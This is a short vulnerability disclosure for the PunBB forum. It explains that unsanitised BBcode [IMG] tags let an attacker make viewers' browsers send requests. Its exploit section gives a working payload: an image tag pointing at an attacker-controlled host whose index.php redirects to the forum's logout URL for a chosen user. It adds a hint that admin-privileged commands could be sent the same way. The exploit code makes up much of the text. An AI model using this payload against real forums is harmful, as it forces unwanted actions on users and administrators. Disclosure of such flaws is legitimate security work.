Vulnerabilities:
~~~~~~~~~~~~~~~~

According to the issue that affect PHPBB discovered by easyex recently at http://www.securityfocus.com/bid/14555/info , so it also affected in another bulletin board or forum that allow BBcode such as PunBB.

The issue is due to a failure of the application to properly sanitize user-supplied input in bbcode '[IMG]' tags included in a message or user signature (if allowed , default is off) .

Successful exploitation of this vulnerability could permit the injection of arbitrary HTML or script code into the browser of an unsuspecting user in the context of the affected site.


Exploit: 
~~~~~~~~

just post a message that include

[img]http://attacker.com/yuckfou.png[/img]

yuckfou.png is a folder , and include some "index.php" file

---- index.php ----

<?php
header("Location: http://target.com/punbb1.2.6/login.php?action=out&id=2"); ?>

---- eof ------

so , user with id=2 if open the topics with attacker message include will automatically "logout"

maybe some other interesting in command could put in "index.php" with admin priveledged *_^


THATS all
